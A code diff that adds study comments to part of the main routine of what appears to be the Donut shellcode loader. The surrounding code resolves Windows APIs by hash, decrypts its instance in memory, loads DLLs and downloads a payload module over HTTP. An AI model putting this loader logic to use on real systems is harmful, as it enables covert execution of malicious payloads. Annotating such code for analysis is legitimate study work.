@@ -92,6 +92,9 @@ HANDLE DonutLoader(PDONUT_INSTANCE inst) {
 }
 
 DWORD MainProc(PDONUT_INSTANCE inst) {
+    // KW: TODO: Determine where this PDONUT_INSTANCE comes from.
+
+
     ULONG                i, ofs, wspace, fspace, len;
     ULONG64              sig;
     DONUT_ASSEMBLY       assembly;
@@ -108,6 +111,7 @@ DWORD MainProc(PDONUT_INSTANCE inst) {
     
     DPRINT("Maru IV : %" PRIX64, inst->iv);
     
+    /* KW: Resolve function calls used for creating threads */
     hash = inst->api.hash[ (offsetof(DONUT_INSTANCE, api.VirtualAlloc) - offsetof(DONUT_INSTANCE, api)) / sizeof(ULONG_PTR)];
     DPRINT("Resolving address for VirtualAlloc() : %" PRIX64, hash);
     _VirtualAlloc = (VirtualAlloc_t)xGetProcAddress(inst, hash, inst->iv);
@@ -125,14 +129,17 @@ DWORD MainProc(PDONUT_INSTANCE inst) {
       return -1;
     }
     
-    DPRINT("VirtualAlloc : %p VirtualFree : %p", 
-      (LPVOID)_VirtualAlloc, (LPVOID)_VirtualFree);
+    // KW: Printing the address of the two functions that were resolved above.
+    DPRINT("VirtualAlloc : %p VirtualFree : %p", (LPVOID)_VirtualAlloc, (LPVOID)_VirtualFree);
     
+    // Allocates memory in current process with read/write permissions
+    // https://docs.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-virtualalloc
     DPRINT("Allocating %i bytes of RW memory", inst->len);
     pv = _VirtualAlloc(NULL, inst->len, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
     
     if(pv == NULL) {
       DPRINT("Memory allocation failed...");
+      /* KW: We have the option to terminate the host process, the one we live in, if memory allocation fails */
       // terminate host process?
       if(inst->exit_opt == DONUT_OPT_EXIT_PROCESS) {
         DPRINT("Terminating host process");
@@ -140,10 +147,14 @@ DWORD MainProc(PDONUT_INSTANCE inst) {
       }
       return -1;
     }
+    
+    /* KW: copy the Donut instance over to the area of memory that was just allocatd.
+      This includes more than just the shellcode, it is the entire structure defined */
     DPRINT("Copying %i bytes of data to memory %p", inst->len, pv);
     Memcpy(pv, inst, inst->len);
     inst = (PDONUT_INSTANCE)pv;
     
+    /* KW: This is the local function copy of the assembly */
     DPRINT("Zero initializing PDONUT_ASSEMBLY");
     Memset(&assembly, 0, sizeof(assembly));
     
@@ -151,10 +162,13 @@ DWORD MainProc(PDONUT_INSTANCE inst) {
     if(inst->entropy == DONUT_ENTROPY_DEFAULT) {
       PBYTE inst_data;
       // load pointer to data just past len + key
+      /* KW: inst_data is a pointer to a block of BYTE data. The address is based on the struct alignment of DONUT_INSTANCE
+        and placesit at the location in memory the module exists. It will be an encrypted chunk of memory. */
       inst_data = (PBYTE)inst + offsetof(DONUT_INSTANCE, api_cnt);
       
       DPRINT("Decrypting %li bytes of instance", inst->len);
       
+      // KW: As stated, used to decrypt the module in place.
       donut_decrypt(inst->key.mk, 
               inst->key.ctr, 
               inst_data, 
@@ -169,14 +183,18 @@ DWORD MainProc(PDONUT_INSTANCE inst) {
         goto erase_memory;
       }
     }
+
+    /* KW: Resolve and save the address of LoadLibraryA for later use */
     DPRINT("Resolving LoadLibraryA");
-    
     inst->api.addr[0] = xGetProcAddress(inst, inst->api.hash[0], inst->iv);
     if(inst->api.addr[0] == NULL) return -1;
     
     str = (PCHAR)inst->dll_names;
     
     // load the DLL required
+    /* KW: str is a character string that contains the DLLs, by name and separated by semi-colon, that should be loaded.
+      This will loop over the list, splitting it, and loading the DLL */
+    // KW: TODO: Is this list dynamic or how does it change
     for(;;) {
       // store string until null byte or semi-colon encountered
       for(i=0; str[i] != '\0' && str[i] !=';' && i<MAX_PATH; i++) path[i] = str[i];
@@ -190,8 +208,8 @@ DWORD MainProc(PDONUT_INSTANCE inst) {
       inst->api.LoadLibraryA(path);
     }
     
+    /* KW: With the DLLs loaded, now resolve individual APIs that are required. */
     DPRINT("Resolving %i API", inst->api_cnt);
-    
     for(i=1; i<inst->api_cnt; i++) {
       DPRINT("Resolving API address for %016llX", inst->api.hash[i]);
         
@@ -203,12 +221,15 @@ DWORD MainProc(PDONUT_INSTANCE inst) {
       }
     }
     
+    /* KW: Determine where the module is located and store it in our `mod` variable for further processing.
+    */
     if(inst->type == DONUT_INSTANCE_HTTP) {
+      /* If it is a HTTP payload, download it  and save to memory */
       DPRINT("Module is stored on remote HTTP server.");
       if(!DownloadFromHTTP(inst)) goto erase_memory;
       mod = inst->module.p;
-    } else
-    if(inst->type == DONUT_INSTANCE_DNS) {
+    } 
+    else if(inst->type == DONUT_INSTANCE_DNS) {
       DPRINT("Module is stored on remote DNS server. (Currently unsupported)");
       goto erase_memory;
       //if(!DownloadFromDNS(inst)) goto erase_memory;
